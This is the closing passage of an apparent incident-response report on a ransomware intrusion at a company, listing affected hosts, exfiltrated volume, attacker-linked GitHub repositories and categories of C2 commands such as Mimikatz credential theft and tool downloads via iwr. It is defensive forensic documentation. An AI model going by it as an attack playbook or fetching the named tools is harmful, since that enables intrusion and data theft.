    Systems Hit:     WS-01-CORP, AD-CORP, FS-CORP
    Systems Safe:    BCKP-CORP
    Data Encrypted:  FS-CORP D:\ drive
    Data Exfil:      ~103 MB
```

### Annex B: GitHub Repositories Used

| Repository | Purpose | Tools |
|------------|---------|-------|
| TomatoTerbang/fluffy-umbrella | Initial access | Reference.docm, rainingdroplets.txt, windyseasons.txt |
| TomatoTerbang/BrainRil | Attack tools | Neurotransmitter, Cerebrum, Brainstemo, BrocaArea |

### Annex C: Commands Executed via C2

Total unique commands across all hosts: **56**

| Category | Count | Examples |
|----------|-------|----------|
| System Recon | 15 | whoami, whoami /priv, hostname, quser |
| Network Recon | 8 | ipconfig, nslookup, ping |
| Service Enum | 6 | sc query, sc stop |
| Directory Listing | 10 | dir, Get-ChildItem |
| Tool Download | 8 | iwr (BrocaArea, Cerebrum, etc.) |
| Credential Theft | 3 | Mimikatz commands |
| Lateral Movement | 2 | Invoke-LargeBrain |
| Ransomware | 2 | Invoke-Broca |

---

**Report Compiled By:** Security Operations Center / DFIR Team  
**Date:** December 18, 2025  
**Classification:** CONFIDENTIAL - INTERNAL USE ONLY

---

*Corp Bhd. Incident Report - Silent Rimba Ransomware Attack - December 2025*
